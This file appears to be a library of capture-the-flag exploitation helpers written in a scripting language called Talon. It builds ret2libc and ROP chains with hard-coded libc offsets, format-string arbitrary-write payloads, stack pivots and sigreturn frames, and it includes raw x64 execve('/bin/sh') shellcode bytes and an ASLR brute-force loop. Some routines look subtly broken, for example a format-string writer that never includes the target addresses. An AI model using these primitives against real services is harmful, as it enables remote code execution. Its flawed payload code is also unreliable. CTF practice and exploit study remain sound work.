# CTF Helper Functions - High-level exploitation utilities
# Import with: include "stdlib/ctf_helpers.talon"

# Quick libc base calculation from leak
define function calc_libc_base(leaked_addr: int, symbol_offset: int): int
    return leaked_addr - symbol_offset
end

# Auto-detect common libc offsets
define function detect_libc_version(leaked_puts: int)
    # Common Ubuntu libc versions
    let versions = {
        "Ubuntu 20.04": 0x809c0,
        "Ubuntu 18.04": 0x7fda0,
        "Ubuntu 22.04": 0x84420
    }
    
    # Try each version
    for version_name in versions
        let offset = versions[version_name]
        let candidate_base = leaked_puts - offset
        
        # Check if base looks reasonable (aligned, within expected range)
        if (candidate_base & 0xfff) == 0
            print("[*] Detected libc:", version_name)
            return candidate_base
        end
    end
    
    print("[!] Could not auto-detect libc version")
    return 0
end

# Build standard ret2libc chain
define function build_ret2libc_chain(libc_base: int, one_gadget: bool)
    if one_gadget
        # Use one-gadget if available
        let gadgets = [
            libc_base + 0x4f3d5,
            libc_base + 0x4f432,
            libc_base + 0x10a41c
        ]
        return gadgets[0]  # Return first one-gadget
    else
        # Standard system("/bin/sh") chain
        return {
            system: libc_base + 0x4f440,
            binsh: libc_base + 0x1b3e9a,
            exit: libc_base + 0x43120
        }
    end
end

# Quick format string offset finder
define function find_fmt_offset(conn, marker)
    # Send test payload with marker
    let test = str(marker) + ".%p" * 20
    send(conn, test)
    let response = recv_until(conn, "\n")
    
    # Parse response to find marker
    let parts = split(response, ".")
    for i in range(len(parts))
        if marker in parts[i]
            return i
        end
    end
    
    return -1
end

# Build format string arbitrary write payload
define function fmtstr_write(offset: int, writes)
    # writes is map of {address: value}
    let payload = ""
    let written = 0
    
    for addr in writes
        let value = writes[addr]
        
        # Calculate bytes to write
        let to_write = value - written
        if to_write < 0
            to_write = to_write + 0x10000
        end
        
        # Build format string
        payload = payload + "%{}c%{}$n".format(to_write, offset)
        written = written + to_write
        
        offset = offset + 1
    end
    
    return payload
end

# Quick cyclic pattern generation and search
define function quick_cyclic(size: int)
    return cyclic(size)
end

define function quick_cyclic_find(pattern)
    return cyclic_find(pattern)
end

# ROP chain builder helper
define function build_rop_chain(gadgets, chain_spec)
    let payload = []
    
    for item in chain_spec
        if type(item) == "string"
            # Gadget name
            payload = payload + [gadgets[item]]
        else
            # Literal value
            payload = payload + [item]
        end
    end
    
    return payload
end

# Quick stack pivot helper
define function pivot_stack(new_stack: int, leave_ret: int)
    # Returns ROP to pivot to new stack
    return [
        leave_ret,  # leave; ret
        new_stack   # New RSP value
    ]
end

# SIGROP helper
define function build_sigrop_frame(rip: int, rsp: int, rdi: int, rsi: int, rdx: int)
    # Build sigreturn frame
    let frame = {
        rip: rip,
        rsp: rsp,
        rdi: rdi,
        rsi: rsi,
        rdx: rdx,
        rax: 15  # rt_sigreturn syscall number
    }
    return frame
end

# Heap helper - calculate tcache bin for size
define function tcache_bin(size: int)
    return (size - 16) / 16
end

# Heap helper - check if size is valid tcache size
define function is_tcache_size(size: int)
    return size >= 16 and size <= 1032
end

# Quick shellcode template selector
define function get_shellcode(arch: string, type: string)
    if arch == "x64"
        if type == "execve"
            return [
                0x48, 0x31, 0xf6,
                0x56,
                0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
                0x57,
                0x54,
                0x5f,
                0x6a, 0x3b,
                0x58,
                0x99,
                0x0f, 0x05
            ]
        else if type == "read_flag"
            # open("/flag", 0); read(fd, buf, 0x100); write(1, buf, 0x100)
            return shellcode_library("x64", "read_flag")
        end
    else if arch == "x86"
        if type == "execve"
            return shellcode_library("x86", "execve_binsh")
        end
    end
    
    return []
end

# Quick connection with auto-retry
define function robust_connect(host: string, port: int, retries: int)
    for attempt in range(retries)
        try
            let conn = connect(host, port)
            print("[+] Connected on attempt", attempt + 1)
            return conn
        catch e
            print("[!] Connection failed, retrying...")
            sleep(1)
        end
    end
    
    print("[-] All connection attempts failed")
    return null
end

# Leak helper with automatic parsing
define function leak_address(conn, leak_func, parse_func)
    # leak_func sends exploit, parse_func extracts address
    leak_func(conn)
    let data = recv(conn, 1024)
    return parse_func(data)
end

# Quick GDB attach helper
define function wait_for_gdb()
    let pid = getpid()
    print("[*] Attach GDB now: gdb -p", pid)
    print("[*] Press enter when ready...")
    input()
end

# Bruteforce ASLR helper
define function bruteforce_aslr(max_attempts: int, exploit_func)
    for attempt in range(max_attempts)
        print("[*] ASLR bruteforce attempt", attempt + 1, "/", max_attempts)
        
        try
            let result = exploit_func()
            if result
                print("[+] Success on attempt", attempt + 1)
                return true
            end
        catch e
            # Failed, retry
            continue
        end
    end
    
    print("[-] ASLR bruteforce failed after", max_attempts, "attempts")
    return false
end

print("[+] CTF helpers loaded - ready for exploitation!")
